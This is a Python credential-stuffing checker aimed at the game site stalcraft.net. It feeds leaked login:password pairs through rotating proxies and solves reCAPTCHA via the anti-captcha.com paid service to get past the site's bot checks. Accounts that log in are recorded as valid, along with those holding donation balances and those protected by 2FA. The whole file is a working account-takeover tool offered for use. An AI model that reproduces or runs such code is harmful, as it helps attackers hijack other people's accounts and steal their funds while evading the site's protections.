import time

from colorama import init, Fore, Style
from config import *

import threading
import queue
import requests

init(autoreset=True)
account_queue = queue.Queue()
proxy_queue = queue.Queue()

siteKeyV2 = '6LdbCb4gAAAAAMbujxfasyMeaQET9kis_FSwwZ11'
siteKeyV2Invisible = '6LfCCb4gAAAAANLeN5_X44PYAqsorCyrLI8S_GwY'


def load_accounts():
    with open('accounts.txt', 'r') as file:
        for line in file:
            account_queue.put(line.strip())


def load_proxies():
    with open('proxies.txt', 'r') as file:
        for line in file:
            proxy_queue.put(line.strip())


def is_proxy_valid(proxy):
    try:
        response = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def get_proxy():
    while True:
        if not proxy_queue.empty():
            proxy_str = proxy_queue.get().strip()

            if proxy_format == 1:
                ip, port = proxy_str.split(':')
                proxy_str = f'{ip}:{port}'
                proxy = {
                    "http": f"{proxy_type}://{ip}:{port}"
                }
            else:
                ip, port, username, password = proxy_str.split(':')
                proxy_str = f'{ip}:{port}:{username}:{password}'
                proxy = {
                    "http": f"{proxy_type}://{username}:{password}@{ip}:{port}"
                }
                print(proxy)

            if is_proxy_valid(proxy):
                return proxy
            else:
                print(f'{Style.BRIGHT}{Fore.MAGENTA}[-] Не рабочий прокси | {proxy_str}')

                continue
        else:
            load_proxies()


def captcha_solverV2():
    payload = {
        'clientKey': antiCaptcha_key,
        'task': {
            'type': 'RecaptchaV2TaskProxyless',
            'websiteURL': 'https://stalcraft.net/login',
            'websiteKey': siteKeyV2,
        }
    }

    headers = {'Content-Type': 'application/json'}

    response_captcha = requests.post('https://api.anti-captcha.com/createTask', json=payload, headers=headers,
                                     timeout=30.0)
    response_data = response_captcha.json()
    task_id = response_data.get('taskId')

    if task_id:
        task_result_payload = {
            'clientKey': antiCaptcha_key,
            'taskId': task_id
        }

        while True:
            response_result = requests.post('https://api.anti-captcha.com/getTaskResult', json=task_result_payload,
                                            headers=headers, timeout=30)
            result = response_result.json()

            if result.get('status') == 'ready':
                captcha_solution = result['solution']['gRecaptchaResponse']
                return captcha_solution
            elif result.get('status') == 'processing':
                time.sleep(5)
            else:
                print(f"{Style.BRIGHT}{Fore.RED} Visible | Произошла ошибка при решении капчи.")
                break
    else:
        print(
            F"{Style.BRIGHT}{Fore.RED}Не удалось создать задачу на решение капчи (НЕ правильно указан api ключ или на вашем api ключе недостаточно средств.")


def captcha_solverV2Invisible(account):
    payload = {
        'clientKey': antiCaptcha_key,
        'task': {
            'type': 'RecaptchaV2TaskProxyless',
            'websiteURL': 'https://stalcraft.net/login',
            'websiteKey': siteKeyV2Invisible,
            'isInvisible': True
        }
    }

    headers = {'Content-Type': 'application/json'}

    response_captcha = requests.post('https://api.anti-captcha.com/createTask', json=payload, headers=headers,
                                     timeout=30)
    response_data = response_captcha.json()
    task_id = response_data.get('taskId')

    if not task_id:
        print(response_data)
        return None
    else:
        task_result_payload = {
            'clientKey': antiCaptcha_key,
            'taskId': task_id
        }

        while True:
            response_result = requests.post('https://api.anti-captcha.com/getTaskResult', json=task_result_payload,
                                            headers=headers, timeout=30.0)
            result = response_result.json()

            if result.get('status') == 'ready':
                captcha_solution = result['solution']['gRecaptchaResponse']
                print(f"{Style.BRIGHT}{Fore.CYAN}Solved captcha | {account}")

                return captcha_solution
            elif result.get('status') == 'processing':
                time.sleep(5)
            else:
                print(F"{Style.BRIGHT}{Fore.RED} Произошла ошибка при решении капчи.")
                break


def worker():
    while True:
        account = account_queue.get()
        if account is None:
            break

        proxy = get_proxy()

        parts = account.split(':')
        if len(parts) == 2:
            username, password = parts
            userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
            print(f"{Style.BRIGHT}{Fore.YELLOW}Solving captcha | {account}")

            solution_captcha = captcha_solverV2()

            if solution_captcha:
                print(f"{Style.BRIGHT}{Fore.CYAN}Solved captcha | {account}")

            payload = {
                'login': username,
                'password': password,
                'tokenV2': solution_captcha,
                'tokenV3': None
            }
            headers = {
                "accept-language": 'en-US',
                "cache-control": "no-cache",
                "content-type": "application/json",
                "dnt": "1",
                "origin": "https://stalcraft.net",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": f"https://stalcraft.net/login",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": userAgent,
                "x-requested-with": "XMLHttpRequest",
            }

            while True:
                response_login = requests.post('https://stalcraft.net/api/auth/login', json=payload,
                                               headers=headers, proxies=proxy).json()
                additional_bot_check = response_login.get('additionalBotCheck')

                if additional_bot_check is None:
                    fa2 = response_login.get('otp')
                    if fa2:
                        print(f"{Style.BRIGHT}{Fore.YELLOW}[-] 2FA - {account}")
                        with open('Result/2FA.txt', 'a') as file:
                            file.write(account + '\n')
                        break

                    if response_login['success'] == True:

                        authToken = response_login['token']
                        authResponse = requests.get('https://stalcraft.net/api/donate', proxies=proxy, headers={
                            'Authorization': f'Bearer {authToken}'
                        })
                        authResponse = authResponse.json()
                        balance = authResponse['balance']

                        print(f"{Style.BRIGHT}{Fore.GREEN}[+] Valid - {account} | Balance: {balance}")
                        with open('Result/Valids.txt', 'a') as file:
                            file.write(account + '\n')
                        if balance > 0:
                            with open('Result/Valids_Balance.txt', 'a') as file:
                                file.write(f'{account} | Balance: {balance}\n')
                        break
                    else:
                        if response_login.get('notify'):
                            if response_login['notify']['title'] == 'notify.too_many_attemps.title':
                                print(f'{Style.BRIGHT}{Fore.YELLOW}Очень много попыток входа для аккаунта: {account}')
                                time.sleep(60)
                                with open('Result/NoCheck.txt', 'a') as file:
                                    file.write(f'{account}\n')
                                continue

                        print(f"{Style.BRIGHT}{Fore.RED}[-] Invalid - {account} ")
                        with open('Result/Invalids.txt', 'a') as file:
                            file.write(account + '\n')
                        break
                else:
                    captchaSolvedINVISIBLE = captcha_solverV2Invisible(account)
                    payload = {
                        'login': username,
                        'password': password,
                        'tokenV2': solution_captcha,
                        'tokenV3': captchaSolvedINVISIBLE
                    }


def main():
    print(f"{Style.BRIGHT}{Fore.LIGHTWHITE_EX}Stalcraft.net checker by Getrequest - lolz.live/getrequest\n")

    load_accounts()
    load_proxies()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
